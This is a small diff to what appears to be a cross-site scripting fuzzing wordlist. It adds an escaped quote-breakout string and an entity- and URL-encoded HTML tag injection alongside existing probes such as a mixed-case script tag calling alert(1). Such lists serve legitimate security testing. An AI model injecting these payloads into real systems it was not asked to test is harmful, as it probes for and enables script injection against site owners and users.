@@ -1,7 +1,9 @@
 # fuzzing
 `'">xss
+\`\'\"`'">xss
 `abc"<'">xss
 '"><h1>test</H1>
+'"%26%23062;%26%23060;h1%26%23062;test%26%23060;/H1%26%23062;
 '"><sCrIpt>alert(1)</scRipT>
 
 //  alert(1)
